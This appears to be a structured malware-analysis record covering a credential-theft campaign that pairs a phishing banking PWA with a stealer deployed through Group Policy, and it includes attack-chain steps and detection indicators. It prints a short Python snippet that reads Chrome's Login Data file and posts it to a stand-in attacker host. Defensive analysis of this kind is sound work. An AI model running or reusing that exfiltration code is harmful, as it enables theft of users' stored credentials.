package_info.why_malicious: The package delivers and executes credential-stealing malware through a phishing Progressive Web Application (PWA) and a custom stealer binary deployed via Group Policy Objects (GPO). It captures sensitive user credentials from banking login forms and browser credential stores, exfiltrating them to attacker-controlled servers. This enables large-scale credential theft and facilitates further compromise of enterprise networks.

execution_context.trigger: runtime (after phishing app installation and user interaction with login form)
execution_context.file_location: Progressive Web Application (PWA) / WebAPK main code (e.g., main.js or equivalent entrypoint)

malicious_snippets.code_behavior: At runtime, after the user enters credentials into the phishing login form, the code captures the username and password from DOM elements, sends the data via HTTPS POST to a hardcoded external command-and-control server, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code programmatically collects sensitive user credentials from a login form and transmits them to an external, attacker-controlled domain. This is a direct indicator of credential-stealing activity, especially when the destination is not associated with the legitimate service.
malice_analysis.violated_expectations: Legitimate banking or financial PWAs should only transmit credentials to their own secure backend endpoints, never to unknown or third-party domains. Sending credentials to a non-bank domain is a severe violation of user trust and security best practices.
malice_analysis.similar_legitimate_use: Legitimate applications may collect credentials for authentication, but only transmit them to trusted, verified domains belonging to the service provider, and typically over secure, well-audited channels.
key_indicators: Credential capture from login form DOM elements
Hardcoded external C2 domain in fetch/POST request
Transmission of sensitive data to non-bank or untrusted domains
Use of HTTPS POST for exfiltration of user credentials

execution_context.trigger: runtime (after custom stealer binary is deployed and executed via GPO on Windows domain machines)
execution_context.file_location: Custom stealer binary/script located on infected Windows endpoints (e.g., C:\Windows\Temp\stealer.exe or similar deployment path)
required_permissions: filesystem (read access to user profile and Chrome data)
access to Chrome user data (Login Data file)

malicious_snippets.code_snippet:
import os
import shutil
import requests
chrome_profile = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
with open(chrome_profile, 'rb') as f:
    data = f.read()
requests.post('http://attacker-c2.com/upload', files={'file': data})
malicious_snippets.code_behavior: At runtime, after the stealer binary is executed on a Windows domain machine, the code locates the Chrome browser's Login Data file, reads its contents, and sends the data via HTTP POST to an attacker-controlled server, resulting in mass credential exfiltration.

malice_analysis.why_suspicious: The code accesses the Chrome browser's credential store and exfiltrates the entire database to an external server. This is a hallmark of stealer malware, especially when combined with automated deployment across multiple endpoints.
malice_analysis.violated_expectations: Legitimate enterprise software should never access or transmit browser credential databases without explicit user consent, and should never send such sensitive data to untrusted or external servers.
malice_analysis.similar_legitimate_use: Some enterprise migration or backup tools may access browser data, but only with user awareness and transmit data to trusted, internal servers—not to unknown external domains.
key_indicators: Direct access to Chrome's Login Data file in user profile
Automated reading and exfiltration of credential database
Outbound HTTP POST to attacker-controlled domain
Deployment and execution via GPO for mass infection

attack_chain.action: Phishing app is delivered to the mobile user via PWA/WebAPK social engineering, impersonating a legitimate banking application.
attack_chain.leads_to: User installs the malicious app, believing it to be a legitimate banking application.

attack_chain.action: Malicious app captures and exfiltrates banking credentials entered by the user into the fake login form.
attack_chain.leads_to: Attacker receives user credentials, enabling account takeover and further compromise.

attack_chain.action: Qilin ransomware group leverages compromised VPN credentials to gain access to the enterprise network.
attack_chain.leads_to: Deployment of custom credential stealer via GPO to domain-connected machines.

attack_chain.action: Custom stealer binary is deployed to all Windows domain-connected machines using Group Policy Objects (GPO).
attack_chain.leads_to: Stealer executes on each infected machine.

attack_chain.action: Stealer accesses Chrome credential store and exfiltrates data to attacker-controlled C2 server.
attack_chain.leads_to: Attacker collects credentials from all users in the domain, enabling further lateral movement and compromise.

behavioral_signatures: PWA/WebAPK apps mimicking financial institutions that request credential input and send data to non-bank or untrusted domains
Automated access to browser credential stores (e.g., Chrome Login Data file) by non-browser processes
Mass deployment of unauthorized binaries or scripts via Group Policy Objects (GPO)
Unusual outbound HTTP/HTTPS POST requests containing credential-like data to external or non-corporate domains
file_indicators: Presence of unauthorized PWA/WebAPK apps with package names or icons mimicking legitimate banks
Custom binaries or scripts accessing Chrome's Login Data file (e.g., C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data)
Unexpected executables or scripts deployed to endpoints via GPO (e.g., C:\Windows\Temp\stealer.exe)
network_indicators: Outbound connections to attacker-controlled C2 domains (e.g., malicious-c2.com, attacker-c2.com)
HTTP/HTTPS POST requests with credential data to non-corporate or untrusted domains
detection_knowledge.how_to_detect: Monitor for installation of unauthorized PWA/WebAPK apps, especially those mimicking financial institutions. Detect access to browser credential stores (such as Chrome's Login Data file) by non-browser processes. Alert on mass deployment of new executables or scripts via GPO. Flag outbound HTTP/HTTPS POST requests containing credential-like data to untrusted or non-corporate domains. Correlate these behaviors to identify and respond to credential-stealing campaigns at an early stage.
